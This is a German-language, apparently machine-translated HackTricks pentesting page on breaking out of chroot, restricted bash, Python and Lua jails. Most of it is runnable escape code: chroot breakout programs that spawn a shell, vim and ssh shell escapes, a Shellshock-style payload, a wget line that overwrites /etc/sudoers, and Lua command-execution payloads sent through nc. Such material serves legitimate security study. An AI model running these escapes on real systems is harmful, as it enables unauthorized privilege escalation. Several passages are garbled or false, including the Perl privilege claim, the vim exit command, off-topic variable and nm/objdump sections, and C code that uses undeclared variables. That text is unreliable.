# Ausbruch aus Gefängnissen

<details>

<summary>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **GitHub-Repositories** senden.

</details>

## **GTFOBins**

**Suchen Sie in** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **nach Binärdateien mit der Eigenschaft "Shell", die ausgeführt werden können**

## Chroot-Eskapaden

Laut [Wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations) ist der Chroot-Mechanismus **nicht dazu gedacht**, sich gegen vorsätzliche Manipulationen durch **privilegierte** (**root**) **Benutzer** zu verteidigen. Auf den meisten Systemen werden Chroot-Kontexte nicht ordnungsgemäß gestapelt, und chrooted Programme **mit ausreichenden Berechtigungen können einen zweiten Chroot durchführen, um auszubrechen**.\
Normalerweise bedeutet dies, dass Sie root sein müssen, um aus dem Chroot auszubrechen.

{% hint style="success" %}
Das **Tool** [**chw00t**](https://github.com/earthquake/chw00t) wurde entwickelt, um die folgenden Szenarien zu missbrauchen und aus `chroot` auszubrechen.
{% endhint %}

### Root + CWD

{% hint style="warning" %}
Wenn Sie **root** in einem Chroot sind, können Sie **ausbrechen**, indem Sie ein **weiteres Chroot** erstellen. Dies liegt daran, dass 2 Chroots (in Linux) nicht gleichzeitig existieren können. Wenn Sie also einen Ordner erstellen und dann **ein neues Chroot** in diesem neuen Ordner erstellen, während Sie **außerhalb davon** sind, befinden Sie sich jetzt **außerhalb des neuen Chroots** und sind daher im Dateisystem.

Dies geschieht normalerweise, weil chroot Ihren Arbeitsverzeichnis nicht in das angegebene Verzeichnis verschiebt, sodass Sie ein Chroot erstellen können, aber außerhalb davon sein können.
{% endhint %}

Normalerweise finden Sie das `chroot`-Binärprogramm nicht in einem Chroot-Gefängnis, aber Sie **könnten ein Binärprogramm kompilieren, hochladen und ausführen**:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>

Perl ist eine interpretierte Programmiersprache, die für ihre Vielseitigkeit und Leistungsfähigkeit bekannt ist. Sie kann verwendet werden, um verschiedene Aufgaben zu automatisieren und komplexe Skripte zu erstellen. Perl-Skripte können auch verwendet werden, um aus einer eingeschränkten Bash-Umgebung auszubrechen und höhere Berechtigungen zu erlangen.

Um aus einer eingeschränkten Bash-Umgebung auszubrechen, können Sie das Perl-Skript verwenden, um eine neue Shell mit höheren Berechtigungen zu starten. Hier ist ein Beispiel für ein Perl-Skript, das dies erreichen kann:

```perl
#!/usr/bin/perl

use strict;
use warnings;

system("/bin/bash");
```

Speichern Sie das Skript in einer Datei mit der Erweiterung ".pl" und führen Sie es aus. Dadurch wird eine neue Shell mit höheren Berechtigungen gestartet, die es Ihnen ermöglicht, auf privilegierte Dateien und Verzeichnisse zuzugreifen.

Es ist wichtig zu beachten, dass das Ausführen dieses Skripts möglicherweise gegen die Sicherheitsrichtlinien eines Systems verstößt und rechtliche Konsequenzen haben kann. Stellen Sie sicher, dass Sie die erforderlichen Berechtigungen haben, um solche Aktionen durchzuführen, und verwenden Sie diese Technik nur zu legitimen Zwecken.
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Gespeicherter FD

{% hint style="warning" %}
Dies ist ähnlich wie im vorherigen Fall, aber in diesem Fall **speichert der Angreifer einen Dateideskriptor** auf das aktuelle Verzeichnis und erstellt dann den Chroot in einem neuen Ordner. Schließlich hat er **Zugriff** auf diesen **FD außerhalb** des Chroots und kann entkommen.
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

{% hint style="warning" %}
FD kann über Unix-Domain-Sockets übergeben werden, also:

* Erstellen Sie einen Kindprozess (fork)
* Erstellen Sie UDS, damit Eltern und Kind kommunizieren können
* Führen Sie chroot im Kindprozess in einem anderen Ordner aus
* Im Elternprozess erstellen Sie eine FD eines Ordners, der außerhalb des neuen Kindprozess-Chroots liegt
* Übergeben Sie diese FD an den Kindprozess über die UDS
* Der Kindprozess wechselt zu diesem FD und da er außerhalb seines Chroots liegt, entkommt er dem Gefängnis
{% endhint %}

### &#x20;Root + Mount

{% hint style="warning" %}
* Mounten Sie das Root-Gerät (/) in ein Verzeichnis innerhalb des Chroots
* Chrooten Sie in dieses Verzeichnis

Dies ist in Linux möglich.
{% endhint %}

### Root + /proc

{% hint style="warning" %}
* Mounten Sie procfs in ein Verzeichnis innerhalb des Chroots (falls noch nicht geschehen)
* Suchen Sie nach einer PID, die einen anderen Root/CWD-Eintrag hat, z.B.: /proc/1/root
* Chrooten Sie in diesen Eintrag
{% endhint %}

### Root(?) + Fork

{% hint style="warning" %}
* Erstellen Sie einen Fork (Kindprozess) und chrooten Sie in einen anderen Ordner weiter im Dateisystem und wechseln Sie in ihn
* Verschieben Sie vom Elternprozess aus den Ordner, in dem sich der Kindprozess befindet, in einen Ordner vor dem Chroot der Kinder
* Dieser Kindprozess wird sich außerhalb des Chroots befinden
{% endhint %}

### ptrace

{% hint style="warning" %}
* Früher konnten Benutzer ihre eigenen Prozesse von einem eigenen Prozess aus debuggen... aber das ist standardmäßig nicht mehr möglich
* Trotzdem, wenn es möglich ist, können Sie mit ptrace in einen Prozess eintreten und einen Shellcode darin ausführen ([siehe dieses Beispiel](linux-capabilities.md#cap\_sys\_ptrace)).
{% endhint %}

## Bash-Gefängnisse

### Enumeration

Holen Sie Informationen über das Gefängnis:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### PATH ändern

Überprüfen Sie, ob Sie die PATH-Umgebungsvariable ändern können.
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Verwendung von vim

Vim ist ein leistungsstarker Texteditor, der auf der Kommandozeile verwendet werden kann. Es gibt verschiedene Möglichkeiten, Vim zu verwenden, um aus einer eingeschränkten Bash-Umgebung auszubrechen und Privilegien zu eskalieren.

#### 1. Shell-Eingabeaufforderung öffnen

Um die Shell-Eingabeaufforderung in Vim zu öffnen, geben Sie den folgenden Befehl ein:

```bash
:!bash
```

Dies öffnet eine neue Shell-Eingabeaufforderung innerhalb von Vim, die mit den Berechtigungen des aktuellen Benutzers ausgeführt wird.

#### 2. Shell-Eingabeaufforderung mit Root-Rechten öffnen

Wenn Sie Root-Rechte erlangen möchten, können Sie den folgenden Befehl verwenden:

```bash
:!sudo bash
```

Dies öffnet eine neue Shell-Eingabeaufforderung innerhalb von Vim mit Root-Rechten.

#### 3. Shell-Eingabeaufforderung mit anderen Benutzerrechten öffnen

Um eine Shell-Eingabeaufforderung mit den Rechten eines anderen Benutzers zu öffnen, verwenden Sie den folgenden Befehl:

```bash
:!sudo -u <benutzername> bash
```

Ersetzen Sie `<benutzername>` durch den Namen des gewünschten Benutzers.

#### 4. Dateien bearbeiten

Sie können Vim auch verwenden, um Dateien zu bearbeiten. Geben Sie dazu den folgenden Befehl ein:

```bash
:!vim <dateiname>
```

Ersetzen Sie `<dateiname>` durch den Namen der zu bearbeitenden Datei. Dadurch wird Vim geöffnet und Sie können den Inhalt der Datei bearbeiten.

#### 5. Befehle ausführen

Vim ermöglicht es Ihnen auch, Befehle direkt auszuführen. Geben Sie dazu den folgenden Befehl ein:

```bash
:! <befehl>
```

Ersetzen Sie `<befehl>` durch den gewünschten Befehl. Dadurch wird der Befehl in der Shell ausgeführt und das Ergebnis wird in Vim angezeigt.

#### 6. Vim verlassen

Um Vim zu verlassen und zur ursprünglichen Bash-Umgebung zurückzukehren, verwenden Sie den Befehl:

```bash
:!exit
```

Dies beendet Vim und kehrt zur ursprünglichen Bash-Umgebung zurück.
```bash
:set shell=/bin/sh
:shell
```
### Skript erstellen

Überprüfen Sie, ob Sie eine ausführbare Datei mit _/bin/bash_ als Inhalt erstellen können.
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Bash von SSH erhalten

Wenn Sie über SSH zugreifen, können Sie diesen Trick verwenden, um eine Bash-Shell auszuführen:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Deklarieren

In der Linux-Bash können Variablen deklariert werden, um Werte zu speichern. Die Syntax zum Deklarieren einer Variablen lautet:

```bash
variable_name=value
```

Hierbei wird der Variablen `variable_name` der Wert `value` zugewiesen. Variablennamen können aus Buchstaben, Zahlen und dem Unterstrich bestehen, dürfen jedoch nicht mit einer Zahl beginnen.

Um den Wert einer Variablen abzurufen, kann der Variablenname mit einem Dollarzeichen vorangestellt werden:

```bash
echo $variable_name
```

Dies gibt den Wert der Variablen `variable_name` aus.

Es ist auch möglich, den Wert einer Variablen zu ändern, indem der Variablenname erneut zugewiesen wird:

```bash
variable_name=new_value
```

Dadurch wird der Wert der Variablen `variable_name` auf `new_value` aktualisiert.
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Sie können beispielsweise die sudoers-Datei überschreiben.
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Weitere Tricks

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells\*\*]\(https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io/\*\*]\(https/gtfobins.github.io)\
**Die folgende Seite könnte auch interessant sein:**

{% content-ref url="../useful-linux-commands/bypass-bash-restrictions.md" %}
[bypass-bash-restrictions.md](../useful-linux-commands/bypass-bash-restrictions.md)
{% endcontent-ref %}

## Python-Gefängnisse

Tricks zum Entkommen aus Python-Gefängnissen finden Sie auf der folgenden Seite:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Lua-Gefängnisse

Auf dieser Seite finden Sie die globalen Funktionen, auf die Sie in Lua zugreifen können: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**Auswertung mit Befehlsausführung:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Einige Tricks, um **Funktionen einer Bibliothek ohne Verwendung von Punkten aufzurufen**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
# Enumerate functions of a library:

To enumerate functions of a library, you can use the following techniques:

1. **Using nm command**: The `nm` command allows you to list symbols from object files or libraries. You can run `nm -D <library>` to display the dynamic symbols of a library. This will show you the function names along with their memory addresses.

2. **Using objdump command**: The `objdump` command can also be used to list symbols from object files or libraries. You can run `objdump -T <library>` to display the dynamic symbols of a library. This will provide you with the function names and their corresponding memory addresses.

3. **Using readelf command**: The `readelf` command is another option to enumerate functions from a library. By running `readelf -s <library>`, you can view the symbol table of the library. This will include the function names and their associated memory addresses.

These techniques can be helpful in understanding the available functions within a library, which can be useful for various purposes such as debugging, reverse engineering, or developing software that utilizes the library's functions.
```bash
for k,v in pairs(string) do print(k,v) end
```
Beachten Sie, dass jedes Mal, wenn Sie den vorherigen Einzeiler in einer **anderen Lua-Umgebung ausführen, die Reihenfolge der Funktionen geändert wird**. Wenn Sie also eine bestimmte Funktion ausführen müssen, können Sie einen Brute-Force-Angriff durchführen, indem Sie verschiedene Lua-Umgebungen laden und die erste Funktion der Bibliothek "le" aufrufen:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Interaktive Lua-Shell erhalten**: Wenn Sie sich in einer begrenzten Lua-Shell befinden, können Sie eine neue Lua-Shell (hoffentlich uneingeschränkt) aufrufen, indem Sie Folgendes eingeben:
```bash
debug.debug()
```
## Referenzen

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Folien: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
